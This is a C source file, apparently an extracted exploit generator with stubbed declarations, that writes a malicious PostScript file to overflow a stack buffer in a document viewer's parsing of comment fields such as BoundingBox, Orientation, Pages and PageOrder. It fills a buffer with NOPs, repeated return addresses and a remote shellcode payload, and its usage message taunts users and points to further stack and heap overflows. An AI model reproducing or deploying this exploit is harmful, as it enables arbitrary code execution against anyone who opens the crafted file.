
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_long ;
typedef char u_char ;
typedef int retaddr ;


 char* BOUND_BOX ;
 int BS ;
 int EXIT_FAILURE ;
 scalar_t__ NNOPS ;
 int NOP ;
 char* ORIENTATION ;
 int OUTFILE ;
 int O_CREAT ;
 int O_RDWR ;
 char* PAGES ;
 char* PAGE_ORDER ;
 char* PS_COMMENT ;
 int RETADDR_BYTES ;
 int close (int) ;
 int die (char*) ;
 int fprintf (int ,char*,char*) ;
 int memcpy (char*,int *,int) ;
 int memset (char*,int ,int) ;
 int open (int ,int,int) ;
 int printf (char*) ;
 int remote ;
 int snprintf (char*,int,char*,char*,...) ;
 int sscanf (char*,char*,int *) ;
 int stderr ;
 int strcat (char*,char*) ;
 int strcpy (char*,int ) ;
 scalar_t__ strlen (int ) ;
 scalar_t__ write (int,char*,int) ;

int main(int argc, char **argv)
{
    int len, x, fd;
    char buf[BS];
    u_char methodman = 0x0;
    u_long retaddr;

    if(argc < 3){
        fprintf(stderr, "Usage: %s < retaddr > < ownage method c b o p r>\n",
argv[0]); return EXIT_FAILURE;
    }
    sscanf(argv[1], "%lx", &retaddr);
    methodman = argv[2][0];


    memset(buf, NOP, BS);
    if(methodman == 'b')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, BOUND_BOX);
    else if(methodman == 'c')
        len = snprintf(buf, BS-1, "%s", PS_COMMENT);
    else if(methodman == 'o')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, ORIENTATION);
    else if(methodman == 'p')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, PAGES);
    else if(methodman == 'r')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, PAGE_ORDER);
    else{
        printf(
        "Cmon man pick a funkin method!!\n"
        "oh i see, 5 is not enough to choose from??\n"
        "don't worry, there are more, just read the source to find them\n"
        "ok fine, you don't want to overflow the stack, understandable.\n"
        "there are also some heap overflows you picky bastard\n"
        "grep -n sscanf\n");
        return EXIT_FAILURE;
    }

    for(x = 0; x < RETADDR_BYTES - 3; x += sizeof(retaddr))
        memcpy(buf+x+len, &retaddr, sizeof(retaddr));
    len += x + NNOPS;
    strcpy(buf+len, remote);
    strcat(buf+len, "\n");
    len += strlen(remote) + 2;


    if( (fd = open(OUTFILE, O_RDWR|O_CREAT, 0666)) < 0)
        die("open");

    if(write(fd, buf, len) < 0)
        die("write");

    close(fd);

    return 0;
}
